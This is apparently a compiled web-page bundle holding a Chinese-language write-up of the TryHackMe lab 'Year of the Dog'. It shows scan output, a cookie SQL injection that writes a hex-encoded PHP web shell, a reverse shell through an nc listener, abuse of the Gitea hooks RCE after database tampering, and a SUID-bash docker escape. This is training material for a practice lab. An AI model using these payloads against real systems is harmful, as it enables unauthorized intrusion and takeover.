"use strict";(self.webpackChunkguardian_jtz_github_io=self.webpackChunkguardian_jtz_github_io||[]).push([[3333],{64544:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>d,contentTitle:()=>i,default:()=>h,frontMatter:()=>s,metadata:()=>o,toc:()=>l});var r=t(74848),a=t(28453);const s={sidebar_position:168,tags:["Easy","Linux","SQLI","SUDO","docker"],title:"Year of the Dog",description:"Year of the Dog",sidebar_label:"Year of the Dog",slug:"/tryhackme/168"},i="Year of the Dog",o={id:"box/TryHackMe/168",title:"Year of the Dog",description:"Year of the Dog",source:"@site/docs/box/TryHackMe/168.md",sourceDirName:"box/TryHackMe",slug:"/tryhackme/168",permalink:"/docs/tryhackme/168",draft:!1,unlisted:!1,tags:[{label:"Easy",permalink:"/docs/tags/easy"},{label:"Linux",permalink:"/docs/tags/linux"},{label:"SQLI",permalink:"/docs/tags/sqli"},{label:"SUDO",permalink:"/docs/tags/sudo"},{label:"docker",permalink:"/docs/tags/docker"}],version:"current",sidebarPosition:168,frontMatter:{sidebar_position:168,tags:["Easy","Linux","SQLI","SUDO","docker"],title:"Year of the Dog",description:"Year of the Dog",sidebar_label:"Year of the Dog",slug:"/tryhackme/168"},sidebar:"boxSidebar",previous:{title:"Different CTF",permalink:"/docs/tryhackme/167"},next:{title:"Jack",permalink:"/docs/tryhackme/169"}},d={},l=[{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:2},{value:"80",id:"80",level:2},{value:"\u540e\u6e17\u900f",id:"\u540e\u6e17\u900f",level:2},{value:"www-data",id:"www-data",level:3},{value:"www-data \u2014&gt; dylan",id:"www-data--dylan",level:3},{value:"dylan \u2014&gt; git(docker)",id:"dylan--gitdocker",level:3},{value:"git(docker) \u2014&gt; root(docker)",id:"gitdocker--rootdocker",level:3},{value:"root(docker) \u2014&gt; root",id:"rootdocker--root",level:3}];function c(e){const n={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",li:"li",ol:"ol",p:"p",pre:"pre",...(0,a.R)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(n.h1,{id:"year-of-the-dog",children:"Year of the Dog"}),"\n",(0,r.jsx)(n.h2,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-19-210:~/adana# nmap -sTCV -p- --min-rate 1000 10.10.61.223\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2023-10-28 07:46 BST\nNmap scan report for ip-10-10-61-223.eu-west-1.compute.internal (10.10.61.223)\nHost is up (0.00031s latency).\nNot shown: 65533 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 e4:c9:dd:9b:db:95:9e:fd:19:a9:a6:0d:4c:43:9f:fa (RSA)\n|   256 c3:fc:10:d8:78:47:7e:fb:89:cf:81:8b:6e:f1:0a:fd (ECDSA)\n|_  256 27:68:ff:ef:c0:68:e2:49:75:59:34:f2:bd:f0:c9:20 (EdDSA)\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: Canis Queue\nMAC Address: 02:BA:D6:FA:61:77 (Unknown)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n"})}),"\n",(0,r.jsx)(n.h2,{id:"80",children:"80"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-19-210:~/adana# gobuster dir -u http://10.10.61.223 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php.txt.html\n===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            http://10.10.61.223\n[+] Threads:        10\n[+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Extensions:     php.txt.html\n[+] Timeout:        10s\n===============================================================\n2023/10/28 08:04:04 Starting gobuster\n===============================================================\n/assets (Status: 301)\n/server-status (Status: 403)\n===============================================================\n2023/10/28 08:04:54 Finished\n===============================================================\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u5728\u8fdb\u884c\u626b\u63cf\u4e4b\u540e\u5e76\u6ca1\u6709\u53d1\u73b0\u53ef\u4ee5\u5229\u7528\u7684\u5730\u65b9, \u63a5\u7740\u67e5\u770b\u7f51\u9875\u7684\u663e\u793a\u6211\u53d1\u73b0\u5728\u6211\u6bcf\u6b21\u8bf7\u6c42\u4e4b\u540e\u7f51\u7ad9\u5bf9\u5e94\u7684 ID \u4e0d\u540c, \u6240\u4ee5\u6211\u731c\u6d4b\u8fd9\u662f\u6839\u636e Cookie \u6765\u4f5c\u4e3a\u5224\u65ad\u7684, \u90a3\u4e48\u4e5f\u5c31\u4f1a\u548c\u5408\u540c\u7684\u6570\u636e\u5e93\u4ea7\u751f\u4ea4\u4e92\u7ecf\u8fc7\u4e00\u7cfb\u5217\u64cd\u4f5c\u4e4b\u540e, \u6211\u786e\u5b9a\u4e86\u5229\u7528\u65b9\u5f0f, \u5229\u7528\u6b64\u6765\u5199\u5165\u4e00\u4e2a WebShell"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"id=177a504b90098b948a5b3769d7984b8f' INTO OUTFILE '/var/www/html/shell.php' LINES TERMINATED BY 0x3C3F706870206563686F20223C7072653E22202E207368656C6C5F6578656328245F4745545B22636D64225D29202E20223C2F7072653E223B3F3E-- -\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u4e4b\u540e\u8bbf\u95ee\u6211\u4eec\u4e0a\u4f20\u7684 WebShell \u6211\u4eec\u5c31\u53ef\u4ee5\u5b9e\u73b0\u547d\u4ee4\u6ce8\u5165\u4e86"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-202210.png",alt:"image-20240709202208535"})}),"\n",(0,r.jsx)(n.h2,{id:"\u540e\u6e17\u900f",children:"\u540e\u6e17\u900f"}),"\n",(0,r.jsx)(n.h3,{id:"www-data",children:"www-data"}),"\n",(0,r.jsx)(n.p,{children:"\u5229\u7528\u4e4b\u524d\u4e0a\u4f20\u7684 WebShell \u6765\u83b7\u53d6\u4e00\u4e2a\u53cd\u5411 Shell"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-202223.png",alt:"image-20240709202222055"})}),"\n",(0,r.jsx)(n.h3,{id:"www-data--dylan",children:"www-data \u2014> dylan"}),"\n",(0,r.jsxs)(n.p,{children:["\u4e4b\u540e\u89c2\u5bdf dylan \u7528\u6237\u7684\u5bb6\u76ee\u5f55\u53d1\u73b0\u6709\u4e00\u4e2a ",(0,r.jsx)(n.code,{children:"work_analysis"})," \u6587\u4ef6, \u7ecf\u8fc7\u67e5\u770b\u53d1\u73b0\u5176\u5185\u5bb9\u4e3a\u5173\u4e8e SSH \u7684\u65e5\u5fd7\u4fe1\u606f, \u4e4b\u540e\u6211\u4eec\u4ece\u4e2d\u5206\u6790\u51fa\u4e86\u7528\u6237 dylan \u7684\u5bc6\u7801"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"(remote) www-data@year-of-the-dog:/home/dylan$ cat work_analysis \nSep  5 20:52:34 staging-server sshd[39184]: Received disconnect from 192.168.1.142 port 45582:11: Bye Bye [preauth]\nSep  5 20:52:34 staging-server sshd[39184]: Disconnected from authenticating user root 192.168.1.142 port 45582 [preauth]\nSep  5 20:52:35 staging-server sshd[39190]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.1.142  user=root\nSep  5 20:52:35 staging-server sshd[39191]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.1.142  user=root\nSep  5 20:52:35 staging-server sshd[39194]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.1.142  user=root\n(remote) www-data@year-of-the-dog:/home/dylan$  cat work_analysis | grep dylan\nSep  5 20:52:57 staging-server sshd[39218]: Invalid user dylanLabr4d0rs4L1f3 from 192.168.1.142 port 45624\nSep  5 20:53:03 staging-server sshd[39218]: Failed password for invalid user dylanLabr4d0rs4L1f3 from 192.168.1.142 port 45624 ssh2\nSep  5 20:53:04 staging-server sshd[39218]: Connection closed by invalid user dylanLabr4d0rs4L1f3 192.168.1.142 port 45624 [preauth]\n"})}),"\n",(0,r.jsx)(n.h3,{id:"dylan--gitdocker",children:"dylan \u2014> git(docker)"}),"\n",(0,r.jsxs)(n.ol,{children:["\n",(0,r.jsxs)(n.li,{children:["\u5728\u7cfb\u7edf\u76ee\u5f55\u4e2d\u6211\u53d1\u73b0 ",(0,r.jsx)(n.code,{children:"/gitea"})," \u76ee\u5f55\u8fd9\u5176\u4e2d\u7684\u5185\u5bb9\u544a\u8bc9\u6211\u7cfb\u7edf\u4e2d\u5b58\u5728\u4e00\u4e2a ",(0,r.jsx)(n.code,{children:"gitea"})," \u670d\u52a1"]}),"\n",(0,r.jsx)(n.li,{children:"\u67e5\u770b\u8fdb\u7a0b\u53d1\u73b0 root \u7528\u6237\u542f\u52a8\u4e86\u4e00\u4e2a docker \u73af\u5883\u5bf9\u5e94\u7684\u7aef\u53e3\u4e3a 3000, \u6070\u597d\u5bf9\u5e94 3000 \u7aef\u53e3\u5c31\u662f gitea \u670d\u52a1"}),"\n",(0,r.jsxs)(n.li,{children:["\u5728 ",(0,r.jsx)(n.code,{children:"/gitea/gitea"})," \u4e0b\u5b58\u5728\u4e00\u4e2a ",(0,r.jsx)(n.code,{children:"gitea.db"})," \u7ecf\u8fc7\u5224\u65ad\u8fd9\u5c31\u662f gitea \u7684\u6570\u636e\u5e93,\u6211\u5c06\u5176\u4e0b\u8f7d\u5230\u672c\u5730\u67e5\u770b\u53d1\u73b0\u5176\u4e2d\u5b58\u5728\u4e00\u4e2a\u7528\u6237\u4f46\u662f\u53ef\u60dc\u5bc6\u7801\u65e0\u6cd5\u89e3\u5bc6"]}),"\n",(0,r.jsx)(n.li,{children:"\u7efc\u4e0a\u6211\u4eec\u53ef\u4ee5\u5224\u65ad\u653b\u51fb\u601d\u8def\u4e3a : \u7aef\u53e3\u8f6c\u53d1 \u2014> \u8bbf\u95ee gitea \u2014> \u83b7\u53d6\u7ba1\u7406\u5458\u8d26\u53f7\u6216\u8005\u4e00\u4e9b\u5176\u4ed6\u4fe1\u606f"}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:"\u6267\u884c\u7aef\u53e3\u8f6c\u53d1, \u4e4b\u540e\u4ece\u672c\u5730\u8bbf\u95ee\u6211\u4eec\u7684\u670d\u52a1"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"(remote) dylan@year-of-the-dog:/home/dylan$  ssh -R 4444:127.0.0.1:3000 root@10.10.138.152\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u4ece\u9875\u9762\u4e2d\u6211\u4eec\u77e5\u9053\u5bf9\u5e94\u7684 gitea \u7248\u672c\u4e3a 1.13.0 \u6070\u597d\u5b58\u5728\u4e00\u4e2a\u5bf9\u5e94\u7684 RCE  \u6f0f\u6d1e\u53ef\u4ee5\u5229\u7528 ",(0,r.jsx)(n.a,{href:"https://github.com/p0dalirius/CVE-2020-14144-GiTea-git-hooks-rce",children:"CVE-2020-14144-GiTea-git-hooks-rce"})]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-202247.png",alt:"image-20240709202245709"})}),"\n",(0,r.jsxs)(n.p,{children:["\u524d\u63d0\u662f\u9700\u8981\u7ba1\u7406\u5458\u8d26\u53f7, \u4f46\u662f\u6211\u4eec\u6ca1\u6709\u7ba1\u7406\u5458\u7684\u8d26\u53f7, \u5728\u4e4b\u524d\u6211\u53d1\u73b0\u5bf9\u4e8e ",(0,r.jsx)(n.code,{children:"gitea.db"})," daylan \u7528\u6237\u5177\u6709 rw \u6743\u9650, \u6240\u4ee5\u6211\u4eec\u521b\u5efa\u4e00\u4e2a\u7528\u6237\u5e76\u4fee\u6539\u5176\u6570\u636e\u5e93\u5bf9\u5e94\u7684\u5b57\u6bb5\u5b8c\u6210\u7ba1\u7406\u5458\u8d26\u53f7\u6dfb\u52a0 (\u65e0\u6cd5\u4fee\u6539 dylan \u7528\u6237\u5bc6\u7801\u5b9e\u73b0\u56e0\u4e3a\u4f1a\u6709\u6821\u9a8c)"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-202255.png",alt:"image-20240709202253558"})}),"\n",(0,r.jsxs)(n.p,{children:["\u4fee\u6539\u5b8c\u6210\u540e\u4e0a\u4f20 ",(0,r.jsx)(n.code,{children:"gitea.db"})," \u5e76\u8986\u76d6\u539f\u672c\u7684\u6587\u4ef6\u5b9e\u73b0\u7ba1\u7406\u5458\u8d26\u53f7\u7684\u6dfb\u52a0, \u4e4b\u540e\u6211\u4eec\u53ea\u9700\u8981\u6309\u7167\u4e0a\u9762 github \u7684\u64cd\u4f5c\u8fdb\u884c\u6267\u884c\u5373\u53ef\u552f\u4e00\u4e0d\u540c\u7684\u662f\u5bf9\u4e8e\u8fdc\u7a0b\u63a8\u9001\u5e76\u4e0d\u9700\u8981\u8fdb\u884c\u64cd\u4f5c, \u6211\u4eec\u53ea\u9700\u8981\u5728 gitea \u4fee\u6539\u6587\u4ef6\u5e76\u4e0a\u4f20\u5373\u53ef"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-138-152:~/yearofthedog# nc -nvlp 4445\nListening on [0.0.0.0] (family 0, port 4445)\nid\nConnection from 10.10.170.22 47472 received!\nbash: cannot set terminal process group (17): Not a tty\nbash: no job control in this shell\nbash-5.0$ id\nuid=1000(git) gid=1000(git) groups=1000(git),1000(git)\n"})}),"\n",(0,r.jsx)(n.h3,{id:"gitdocker--rootdocker",children:"git(docker) \u2014> root(docker)"}),"\n",(0,r.jsx)(n.p,{children:"\u6211\u53d1\u73b0 git \u7528\u6237\u5177\u6709 SUDO \u7279\u6743\u53ef\u4ee5\u5f88\u5feb\u7684\u83b7\u53d6\u5230 Shell"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-202303.png",alt:"image-20240709202302183"})}),"\n",(0,r.jsx)(n.h3,{id:"rootdocker--root",children:"root(docker) \u2014> root"}),"\n",(0,r.jsxs)(n.ol,{children:["\n",(0,r.jsxs)(n.li,{children:["\u4e4b\u524d\u6211\u4eec\u4fee\u6539\u672c\u5730\u7684 ",(0,r.jsx)(n.code,{children:"gitea.db"})," \u5e76\u5b9e\u73b0\u4e86\u5bf9 gitea \u5e73\u53f0\u7684\u767b\u9646, \u6240\u4ee5\u5bf9\u5e94\u7684\u76ee\u5f55\u80af\u5b9a\u548c docker \u662f\u6302\u8f7d\u7684"]}),"\n"]}),"\n",(0,r.jsxs)(n.p,{children:["\u6211\u53d1\u73b0 ",(0,r.jsx)(n.code,{children:"/app"})," \u76ee\u5f55\u548c ",(0,r.jsx)(n.code,{children:"/gitea"})," \u76ee\u5f55\u76f8\u540c, \u6240\u4ee5\u53ef\u4ee5\u5206\u6790\u51fa\u8fd9\u5c31\u662f\u6302\u8f7d\u76ee\u5f55, \u6240\u4ee5\u6211\u4eec\u53ea\u9700\u8981\u7b80\u5355\u64cd\u4f5c\u4e00\u4e0b\u5373\u53ef"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"#  \u9776\u673a\u7aef\n(remote) dylan@year-of-the-dog:/gitea/gitea$ cp /bin/bash .\n\n# docker\nchown root:root bash\nchmod u+s bash\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u4e4b\u540e\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\u9776\u673a\u7684 bash \u4e5f\u88ab\u8d4b\u4e88\u4e86 SUID \u7279\u6743"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-202314.png",alt:"image-20240709202313270"})})]})}function h(e={}){const{wrapper:n}={...(0,a.R)(),...e.components};return n?(0,r.jsx)(n,{...e,children:(0,r.jsx)(c,{...e})}):c(e)}},28453:(e,n,t)=>{t.d(n,{R:()=>i,x:()=>o});var r=t(96540);const a={},s=r.createContext(a);function i(e){const n=r.useContext(s);return r.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function o(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(a):e.components||a:i(e.components),r.createElement(s.Provider,{value:n},e.children)}}}]);